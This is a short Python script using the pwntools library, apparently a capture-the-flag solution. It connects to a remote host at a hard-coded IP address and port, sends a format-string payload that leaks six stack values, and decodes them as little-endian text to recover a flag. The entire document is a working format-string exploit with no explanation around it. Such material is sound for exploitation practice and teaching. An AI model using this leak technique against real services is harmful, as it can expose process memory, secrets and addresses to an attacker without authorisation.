from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31779)
payload = b"%14$p %15$p %16$p %17$p %18$p %19$p"
r.sendline(payload)
res = r.recvall(timeout=2).decode()
parts = res.split()[0:6]

flag = ""
for p in parts:
    if p.startswith("0x"):
        try:
            # Little endian decode
            flag += bytes.fromhex(p[2:])[::-1].decode('utf-8')
        except:
            pass
print("FLAG:", flag)
